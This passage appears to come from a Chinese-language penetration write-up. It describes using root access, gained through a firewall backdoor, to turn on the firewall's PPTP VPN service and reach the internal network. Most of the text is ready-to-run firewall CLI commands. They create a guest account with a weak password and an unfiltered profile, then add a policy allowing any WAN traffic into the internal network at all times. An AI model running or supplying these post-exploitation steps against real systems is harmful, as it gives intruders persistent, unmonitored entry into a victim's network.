这个后门获取到的是防火墙的root权限，就是所有防火墙的操作我们都可以做，这里我们利用防火墙的  
vpn服务来进入到内网中 ，从而进行进一步渗透。

0x01开启vpn

```
1.  
    

1.  `config vpn pptp`
    
2.  `set status enable`
    
3.  `set eip 192.168.200.100`
    
4.  `set sip 192.168.200.1`
    
5.  `set usrgrp Guest-group`
    
6.  `end`
    
7.  
    
8.  `config user local`
    
9.  `edit "guest"`
    
10.  `set type password`
     
11.  `set passwd 123456`
     
12.  `next`
     
13.  `end`
     
14.  
     
15.  `config user group`
     
16.  `edit "Guest-group"`
     
17.  `set profile "unfiltered"`
     
18.  `set member "guest"`
     
19.  `next`
     
20.  `end`
     
21.  
     
22.  `config firewall policy`
     
23.  `edit 9`
     
24.  `set srcintf "wan1"`
     
25.  `set dstintf "internal"`
     
26.  `set srcaddr "all"`
     
27.  `set dstaddr "all"`
     
28.  `set action accept`
     
29.  `set schedule "always"`
     
30.  `set service "ANY"`
     
31.  `next`
     
32.  `end`
```
